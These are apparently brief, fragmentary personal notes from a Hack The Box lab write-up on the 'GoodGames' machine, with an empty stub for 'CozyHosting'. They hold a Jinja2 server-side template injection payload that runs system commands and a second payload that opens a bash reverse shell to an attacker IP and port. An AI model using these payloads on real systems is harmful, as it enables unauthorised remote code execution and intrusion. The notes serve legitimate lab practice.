## Table of Contents

- [goodGames](#goodgames)
      - [Shell](#Shell)
      - [Execution POC](#Execution\POC)
- [CozyHosting](#cozyhosting)

10.10.11.156

# goodGames
Port: 80 Open http Apache httpd 2.4.51

echo '10.10.11.130 GoodGames.HTB' | sudo tee -a /etc/hosts 
10.10.11.130 GoodGames.HTB
200      GET      728l     2070w    33387c http://goodgames.htb/signup
#### Shell

I’ll use the same payload to get a reverse shell:

#### Execution POC

Just like in the recently retired box [Bolt](https://0xdf.gitlab.io/2022/02/19/htb-bolt.html#ssti), I can try a simple payload to see if I can get system execution via this SSTI:

```
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

```
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.7/6969 0>&1"').read() }}
```




# CozyHosting
10.10.11.230

